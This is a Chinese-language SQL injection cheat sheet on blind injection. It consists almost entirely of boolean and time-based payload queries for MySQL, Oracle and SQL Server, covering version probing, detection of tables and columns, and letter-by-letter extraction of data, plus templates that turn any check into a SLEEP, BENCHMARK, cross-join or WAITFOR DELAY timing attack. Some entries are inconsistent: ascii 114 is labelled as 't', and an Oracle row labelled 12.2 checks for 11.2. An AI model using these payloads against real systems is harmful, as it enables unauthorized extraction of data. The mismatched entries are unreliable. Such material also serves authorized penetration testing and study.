### 盲注 {docsify-ignore-all}
盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。

#### MySQL

##### 部分盲

部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。

| 描述   |      语句     |  
|----------|:-------------:|
| 版本是5.xx   |      SELECT substring(version(),1,1)=5     |  
| 子选择启用   |      SELECT 1 AND (select 1)=1     |  
| 表log\_table存在   | SELECT 1 AND (select 1 from log_table limit 0,1)=1   |  
| 列message存在于表log\_table中 <br />注意：如果列不存在，则查询应该出错   |      SELECT message FROM log_table LIMIT 0,1     |  
| 第一条message的第一个字母是t   |      SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114     |  


##### 将部分盲查询转换为全盲查询

通过使用以下转换，可以在全盲方案中使用上述任何查询：

```code
SELECT IF(*PARTIAL_BLIND_QUERY*, SLEEP(5), null)
```

##### 全盲

部分盲注可以通过HTTP响应中的不同HTTP状态代码，响应时间，内容长度和HTML内容来确定。这些标记可以指示真或假的陈述。下面的查询将试图通过在猜测的信息上声明真或假的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。

| 描述   |      语句     |  
|----------|:-------------:|
| 用户是root   |      	SELECT IF(user() LIKE 'root@%', SLEEP(5), null)     |  
| 用户是root（Benchmark 方法）   |      SELECT IF(user() LIKE 'root@%', BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds')), null)     |  
| 版本是5.xx   |      SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)    |  



#### Oracle

##### 部分盲

部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。

| 描述   |      语句     |  
|----------|:-------------:|
| 版本是12.2   |      SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';     |  
| 子选择启用  |      SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)     |  
| 表log\_table存在  |      	SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);     |  
| 列message存在于表log\_table中   |      Select COUNT(*) from user\_tab\_cols where column\_name = 'MESSAGE' and table\_name = 'LOG_TABLE';     |  
| 第一条message的第一个字母是t  |      Select message from log_table where rownum=1 and message LIKE 't%';     |  

#####   将部分盲查询转换为全盲查询

通过使用以下转换，可以在全盲方案中使用上述任何查询： 

```code
SELECT CASE WHEN (*PARTIAL_BLIND_QUERY*)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual
```

部分盲查询必须返回一行，因此总是尝试在所选列上使用COUNT。添加"all_users [letter]"，直到数据库响应变慢。 如果数据库缓存响应，您可能需要循环[letter]。

##### 全盲

全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他[out-of-band](/attackQueries/dataExfiltration) 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。

| 描述   |      语句     |  
|----------|:-------------:|
| 版本是12.2  |      SELECT CASE WHEN (SELECT COUNT(\*) FROM v$version WHERE banner LIKE 'Oracle%11.2%')=1 THEN (SELECT count(*) FROM all\_users a, all\_users b, all\_users c, all\_users d) ELSE 0 END FROM dual     |  





#### SQL Server

##### 部分盲

部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。

| 描述   |      语句     |  
|----------|:-------------:|
| 版本是12.0.2000.8   |      SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'     |  
| 子选择启用   |      SELECT (SELECT @@version)     |  
| 表log\_table存在  |      SELECT * FROM log_table     |  
| 列message存在于表log\_table中  |      SELECT message from log_table     |  
| 第一条message的第一个字母是t   |      WITH data AS (SELECT (ROW\_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%'     |  

#####  将部分盲查询转换为全盲查询

通过使用以下转换，可以在全盲方案中使用上述任何查询： 

```code
IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02'
```
##### 全盲

全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他[out-of-band](/attackQueries/dataExfiltration) 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。

| 描述   |      语句     |  
|----------|:-------------:|
| Version is 12.0.2000.8   |      IF exists(SELECT @@version where @@version like '%12.0.2000.8%') WAITFOR DELAY '00&#58;00&#58;02'     |  




